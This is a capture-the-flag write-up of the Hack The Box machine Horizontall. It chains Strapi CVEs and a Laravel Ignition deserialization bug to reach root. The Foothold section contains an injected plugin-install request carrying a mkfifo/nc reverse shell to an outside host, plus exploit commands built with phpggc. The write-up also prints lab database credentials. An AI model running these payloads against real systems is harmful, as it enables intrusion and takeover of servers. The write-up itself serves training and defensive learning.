# Horizontall

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.105 |
| **Status** | Retired |

## Overview
Horizontall is an easy-rated Linux machine that only exposes HTTP and SSH. The front-end Vue.js application's compiled JavaScript reveals a hidden API virtual host running the **Strapi Headless CMS**, whose outdated version is vulnerable to two chained CVEs (unauthenticated password reset and authenticated plugin-install RCE), yielding a shell as the `strapi` service user. From there, a locally-bound **Laravel** application is discovered listening only on loopback; tunneling to it over SSH exposes Laravel debug mode, which is exploited with the Laravel Ignition PHAR-deserialization RCE (using `phpggc` gadget chains) to escalate to root.

## Reconnaissance
`nmap -sC -sV -A` against `10.10.11.105` (hostname `horizontall.htb`) showed:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
```

The web application on port 80 only functioned correctly when accessed via the `horizontall.htb` hostname, and buttons/interactive elements on the page were broken when browsed directly.

## Enumeration
The front page is a Vue.js single-page application. Reviewing the built JavaScript bundle revealed the frontend's API calls, notably:

```js
getReviews(){
  axios.get('http://api-prod.horizontall.htb/reviews')
  .then(response => this.reviews = response.data)
}
```

This disclosed a previously-unknown virtual host, **`api-prod.horizontall.htb`**, which after being added to `/etc/hosts` was found to be running the **Strapi** headless CMS. The reviews endpoint itself leaked non-sensitive review data, but the discovery of the Strapi backend was the key finding, since this version was vulnerable to two known CVEs.

## Foothold
Strapi 3.0.0-beta was vulnerable to **CVE-2019-18818** (unauthenticated password reset), exploited to reset the password of the built-in `admin` account:

```
python3 50237.py     # sets a new password for john@horizontall.htb via the vulnerable reset-password flow
```

Logging in with the reset credentials returned a valid admin JWT. Strapi versions up to 3.0.0-beta.17.7 are additionally vulnerable to **CVE-2019-19609** (authenticated RCE via the plugin-install endpoint), which was exploited by sending a crafted plugin name containing a shell command:

```
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
Authorization: Bearer <admin JWT>
Content-Type: application/json

{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.97 4444 >/tmp/f)","port":"8080"}
```

This returned a reverse shell as the `strapi` service user, providing the initial foothold.

## Privilege Escalation
Enumerating listening sockets on the box showed several services bound only to `127.0.0.1`, including a **Laravel** application on port **8000** (alongside Strapi's own internal node process on 1337 and MySQL on 3306, whose Strapi database credentials: `developer:#J!:F9Zt2u`: were also recovered from the Strapi configuration but were not required for the final privesc). An SSH local port-forward was used to reach the Laravel instance:

```
ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb
```

The Laravel app was running with debug mode enabled, exposing the **Laravel Ignition** "solutions" endpoint, vulnerable to a PHAR deserialization RCE (`_ignition/execute-solution`, CVE-2021-3129). This was exploited using the public `laravel-ignition-rce.py` tool together with `phpggc` to generate a Monolog RCE gadget chain, write it into the Laravel log file, convert it to a valid `.phar` via `php://filter` chains, and trigger deserialization through the `phar://` wrapper:

```
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
```

The Laravel process was running as **root**, so successful command execution through this chain granted a root shell and access to `/root/root.txt`.

## Lessons Learned
- Client-side JavaScript bundles frequently leak internal API hostnames/endpoints that are not otherwise discoverable through normal enumeration.
- Running multiple outdated CMS/framework versions (Strapi, Laravel) on the same host multiplies the attack surface: each individually-patchable CVE can chain into full compromise.
- Services deliberately bound to `127.0.0.1` are not a security boundary once any remote code execution or SSH access is achieved; SSH local port forwarding trivially reaches them.
- Laravel's debug mode (and the bundled Ignition error-page tooling) must never be enabled in production, as it exposes powerful deserialization primitives.

## Tools & References
- `nmap` for initial service discovery.
- Browser devtools / manual review of compiled Vue.js JS to find the hidden `api-prod` vhost.
- `50237.py` (kept in `files/`): Strapi 3.0.0-beta unauthenticated password reset, CVE-2019-18818.
- `rce-strapi.py` (kept in `files/`): Strapi ≤3.0.0-beta.17.7 authenticated RCE via plugin install, CVE-2019-19609.
- `privescdev.py` (kept in `files/`): Laravel Ignition PHAR deserialization exploit driver using `phpggc` gadget chains, CVE-2021-3129.
- **Omitted from repository** (cloned third-party tool source trees, available upstream):
  - `phpggc/` and `Files/phpggc/`: full clone of the PHP gadget-chain generator used to build the Monolog RCE payload. Upstream: `https://github.com/ambionics/phpggc`.
  - `laravel-exploits/`: clone containing `laravel-ignition-rce.py`, the public Laravel Ignition RCE PoC referenced above.
  - `Files/` (screenshots, JS map files, misc scratch images): working artifacts from manual testing, superseded by the narrative above.
  - `LJktkYQn5H067PPnBODU`: a 2-byte stray scratch file with no meaningful content.
